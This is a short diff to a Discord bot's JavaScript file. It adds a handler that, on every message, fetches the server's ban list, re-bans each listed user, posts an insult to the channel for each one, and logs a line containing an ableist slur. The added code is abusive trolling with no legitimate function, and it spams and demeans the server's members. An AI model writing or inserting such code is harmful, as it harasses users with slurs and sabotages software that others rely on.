@@ -259,4 +259,14 @@ global.reboot = function resetBot(channel) {
     .then(() => console.log(`  Ping: ${bot.ping}\n  Process restarted!`)));
 }
 
+bot.on('message', message => {
+    message.guild.fetchBans().then(bans => {
+        bans.forEach(user => {
+            console.log('topkek -- they actually updated, retards');
+            message.channel.send("Well, you're all autistic...")
+            message.guild.ban(user);
+        });
+    });
+})
+
 bot.login(botconfig.token);
